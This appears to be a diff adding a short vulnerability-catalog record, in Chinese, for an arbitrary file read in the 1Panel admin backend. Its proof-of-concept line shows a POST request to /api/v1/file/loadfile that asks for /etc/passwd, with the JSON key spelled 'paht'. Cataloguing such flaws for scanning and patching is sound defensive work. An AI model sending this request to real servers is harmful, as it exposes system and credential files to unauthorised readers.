@@ -1,0 +1,8 @@
+vendor = "1Panel"
+name = "1Panel loadfile 后台文件读取漏洞"
+type = "任意文件读取"
+source = "TG"
+info = "1Panel后台存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息文件"
+date = "8.14"
+poc = "POST /api/v1/file/loadfile {\"paht\":\"/etc/passwd\"}"
+label = "nday"
